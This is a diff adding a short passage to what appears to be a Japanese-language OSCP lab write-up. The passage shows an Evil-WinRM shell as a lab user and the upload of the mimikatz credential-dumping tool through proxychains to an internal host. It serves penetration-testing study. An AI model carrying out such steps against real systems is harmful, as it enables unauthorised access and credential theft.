@@ -771,3 +771,16 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
 oscp\celia.almeda
 ```
+Evil-WinRM の中で mimikatz ダウンロード
+```
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> upload mimikatz
+                                        
+Info: Uploading /home/rnozaka/Documents/OSCP_A/mimikatz to C:\Users\celia.almeda\Documents\mimikatz
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+                                        
+Data: 1589708 bytes of 1589708 bytes copied
+                                        
+Info: Upload successful!
+
+```
